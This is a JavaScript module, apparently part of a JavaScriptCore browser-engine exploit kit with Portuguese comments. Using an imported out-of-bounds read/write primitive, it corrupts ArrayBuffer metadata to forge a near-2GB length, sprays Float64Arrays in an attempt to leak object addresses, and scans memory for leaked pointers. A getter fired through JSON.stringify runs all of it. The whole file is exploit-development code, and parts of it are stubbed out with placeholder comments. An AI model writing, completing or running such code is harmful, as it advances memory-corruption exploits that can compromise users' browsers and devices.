// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMassiveAttack";
let getter_called_flag = false;
let current_test_results = {
    overall_success: false,
    message: "Teste não iniciado.",
    length_retype_success: false,
    length_retype_details: "",
    addrof_spray_success: false,
    addrof_spray_leaks: [],
    snoop_success: false,
    snoop_leaks: [],
    fresh_ab_test_details: "",
    api_interaction_errors: [],
    error: null
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Para Teste 1: Metadados sombra para tamanho gigante
const FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE = 0x0; // Plantar no início do oob_ab
const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); // Quase 2GB
const FAKE_AB_DATA_POINTER_FOR_RETYPE = new AdvancedInt64(0x0, 0x0); // Aponta para o início do oob_ab

class CheckpointForMassiveAttack {
    constructor(id) {
        this.id_marker = `MassiveAttackCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "MassiveAttack_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Iniciando bateria de testes...`, "vuln", FNAME_GETTER);
        
        // Resetar resultados parciais a cada chamada do getter
        current_test_results = {
            overall_success: false, message: "Getter chamado, testes em andamento.",
            length_retype_success: false, length_retype_details: "",
            addrof_spray_success: false, addrof_spray_leaks: [],
            snoop_success: false, snoop_leaks: [],
            fresh_ab_test_details: "", api_interaction_errors: [], error: null
        };

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer) {
                throw new Error("Dependências críticas (OOB R/W, oob_ab, Offsets) não disponíveis no getter.");
            }

            // --- Teste 1: Re-tentativa de Re-Tipagem de Length do oob_array_buffer_real ---
            logS3("DENTRO DO GETTER (Teste 1): Tentando Re-Tipagem de Length do oob_array_buffer_real...", "subtest", FNAME_GETTER);
            try {
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
                current_test_results.length_retype_details = `Metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}) plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]. `;
                
                const reader = new Uint32Array(oob_array_buffer_real);
                current_test_results.length_retype_details += `Uint32Array criado. Length reportado: ${reader.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}.`;
                logS3(current_test_results.length_retype_details, "info", FNAME_GETTER);

                if (reader.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
                    current_test_results.length_retype_success = true;
                    current_test_results.overall_success = true;
                    current_test_results.message = "SUCESSO NA RE-TIPAGEM DE LENGTH! ";
                    logS3(current_test_results.message, "vuln", FNAME_GETTER);
                    // Tentar leitura OOB
                    const oob_idx = (oob_array_buffer_real.byteLength / 4) + 50;
                    if (oob_idx < reader.length) {
                        const val = reader[oob_idx];
                        current_test_results.length_retype_details += ` Leitura OOB em [${oob_idx}]=${toHex(val)}.`;
                        logS3(`Leitura OOB em reader[${oob_idx}]=${toHex(val)}`, "leak", FNAME_GETTER);
                    }
                } else {
                     current_test_results.length_retype_details += ` Falha na re-tipagem de length (Esperado ${FAKE_AB_HUGE_SIZE.low()/4}).`;
                }
            } catch (e1) {
                current_test_results.length_retype_details += ` Erro: ${e1.message}.`;
                logS3(`Erro no Teste 1 (Re-Tipagem Length): ${e1.message}`, "error", FNAME_GETTER);
            }

            // --- Teste 2: Tentativa de addrof Especulativo com Spray ---
            logS3("DENTRO DO GETTER (Teste 2): Tentando addrof especulativo com spray...", "subtest", FNAME_GETTER);
            try {
                const target_obj_addrof = { leak_marker: 0xABCDABCD + Date.now() };
                const spray_size = 100;
                let float_readers = [];
                let obj_holders = [];
                const float_pattern_addrof = Math.E;

                for(let i=0; i<spray_size; i++) {
                    let fa = new Float64Array(8);
                    fa.fill(float_pattern_addrof + i);
                    float_readers.push(fa);
                    obj_holders.push( (i === spray_size / 2) ? [target_obj_addrof] : [{dummy:i}] );
                }
                let leak_found_in_spray = false;
                for(let i=0; i<float_readers.length; i++) {
                    for(let j=0; j<float_readers[i].length; j++) {
                        if (float_readers[i][j] !== (float_pattern_addrof + i)) {
                            const f_val = float_readers[i][j];
                            const dv = new DataView(new ArrayBuffer(8));
                            dv.setFloat64(0, f_val, true);
                            const p_low = dv.getUint32(0, true);
                            const p_high = dv.getUint32(4, true);
                            const p_adv64 = new AdvancedInt64(p_low, p_high);
                            current_test_results.addrof_spray_leaks.push(`FloatArray[${i}][${j}] = ${p_adv64.toString(true)} (float: ${f_val})`);
                            leak_found_in_spray = true;
                        }
                    }
                }
                if (leak_found_in_spray) {
                    current_test_results.addrof_spray_success = true;
                    current_test_results.overall_success = true;
                    logS3("POTENCIAL LEAK DE ENDEREÇO NO SPRAY DE FLOAT!", "vuln", FNAME_GETTER);
                }
                current_test_results.addrof_spray_leaks.unshift(`Spray de ${spray_size} arrays concluído.`);

            } catch (e2) {
                current_test_results.addrof_spray_leaks.push(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`);
                logS3(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`, "error", FNAME_GETTER);
            }

            // --- Teste 3: Sondagem Ampla do oob_array_buffer_real por Ponteiros Vazados ---
            logS3("DENTRO DO GETTER (Teste 3): Sondando oob_array_buffer_real por ponteiros vazados...", "subtest", FNAME_GETTER);
            try {
                const snoop_end_t3 = Math.min(0x400, oob_array_buffer_real.byteLength); // Primeiros 1KB
                let ptr_found_in_snoop = false;
                for (let offset = 0; offset < snoop_end_t3; offset += 8) {
                    if (offset === CORRUPTION_OFFSET_TRIGGER) continue; // Ignorar o valor que escrevemos
                    const val64 = oob_read_absolute(offset, 8);
                    if (!val64.equals(AdvancedInt64.Zero)) {
                        current_test_results.snoop_leaks.push(`${toHex(offset)}: ${val64.toString(true)}`);
                        if (val64.high() > 0x1000 && val64.high() < 0x80000000 && !val64.equals(CORRUPTION_VALUE_TRIGGER)) {
                             logS3(`PONTEIRO SUSPEITO em oob_data[${toHex(offset)}] = ${val64.toString(true)}`, "leak", FNAME_GETTER);
                             ptr_found_in_snoop = true;
                        }
                    }
                }
                if (ptr_found_in_snoop) {
                    current_test_results.snoop_success = true;
                    current_test_results.overall_success = true;
                }
                current_test_results.snoop_leaks.unshift(`Sondagem de ${toHex(snoop_end_t3)} bytes concluída.`);
            } catch (e3) {
                current_test_results.snoop_leaks.push(`Erro no Teste 3 (Sondagem): ${e3.message}`);
                logS3(`Erro no Teste 3 (Sondagem): ${e3.message}`, "error", FNAME_GETTER);
            }

            // --- Teste 4: ArrayBuffer "Fresco" ---
            logS3("DENTRO DO GETTER (Teste 4): Verificando ArrayBuffer 'fresco'...", "subtest", FNAME_GETTER);
            try {
                let fresh_ab = new ArrayBuffer(128);
                let dv_fresh = new DataView(fresh_ab);
                dv_fresh.setUint32(0, 0x42424242, true);
                if (fresh_ab.byteLength === 128 && dv_fresh.getUint32(0,true) === 0x42424242) {
                    current_test_results.fresh_ab_test_details = "AB fresco funciona normalmente.";
                } else {
                    current_test_results.fresh_ab_test_details = `AB fresco ANÔMALO! Length: ${fresh_ab.byteLength}, Conteúdo[0]: ${toHex(dv_fresh.getUint32(0,true))}`;
                    current_test_results.overall_success = true; // Comportamento anômalo é um "sucesso"
                }
                logS3(current_test_results.fresh_ab_test_details, current_test_results.overall_success && current_test_results.fresh_ab_test_details.includes("ANÔMALO") ? "vuln" : "info", FNAME_GETTER);
            } catch (e4) {
                current_test_results.fresh_ab_test_details = `Erro no Teste 4 (AB Fresco): ${e4.message}`;
                logS3(`Erro no Teste 4 (AB Fresco): ${e4.message}`, "error", FNAME_GETTER);
            }
            
            // Atualizar mensagem geral se nenhum sucesso específico foi encontrado
            if (!current_test_results.overall_success) {
                current_test_results.message = "Bateria de testes no getter concluída, sem sucesso óbvio em re-tipagem ou vazamento.";
            } else {
                 current_test_results.message = "Bateria de testes no getter CONCLUÍDA COM POTENCIAL SUCESSO em um ou mais sub-testes!";
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForMassiveAttack.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_massive_attack_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "executeMassiveAttackInGetter";
    logS3(`--- Iniciando Bateria de Testes Agressivos no Getter ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* ... reset ... */ }; // Reset no início do teste principal

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);

        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForMassiveAttack(1);
        logS3(`CheckpointForMassiveAttack objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST_RUNNER); }

    } catch (mainError) {
        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError);
        current_test_results.message = `Erro crítico no runner: ${mainError.message}`;
        current_test_results.error = String(mainError);
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    if (getter_called_flag) {
        if (current_test_results.overall_success) {
            logS3(`RESULTADO BATERIA DE TESTES: SUCESSO GERAL ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO BATERIA DE TESTES: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        logS3(`  Detalhes Re-Tipagem Length: ${current_test_results.length_retype_details}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Sucesso AddrOf Spray: ${current_test_results.addrof_spray_success}. Leaks: ${current_test_results.addrof_spray_leaks.length}`, "info", FNAME_TEST_RUNNER);
        current_test_results.addrof_spray_leaks.forEach(l => logS3(`    ${l}`, "leak", FNAME_TEST_RUNNER));
        logS3(`  Sucesso Sondagem oob_ab: ${current_test_results.snoop_success}. Leaks: ${current_test_results.snoop_leaks.length}`, "info", FNAME_TEST_RUNNER);
        current_test_results.snoop_leaks.forEach(l => logS3(`    ${l}`, "leak", FNAME_TEST_RUNNER));
        logS3(`  Detalhes AB Fresco: ${current_test_results.fresh_ab_test_details}`, "info", FNAME_TEST_RUNNER);
        logS3(`  Erros API: ${current_test_results.api_interaction_errors.join('; ')}`, "info", FNAME_TEST_RUNNER);

    } else {
        logS3("RESULTADO BATERIA DE TESTES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
    }

    clearOOBEnvironment();
    logS3(`--- Bateria de Testes Agressivos no Getter Concluída ---`, "test", FNAME_TEST_RUNNER);
}
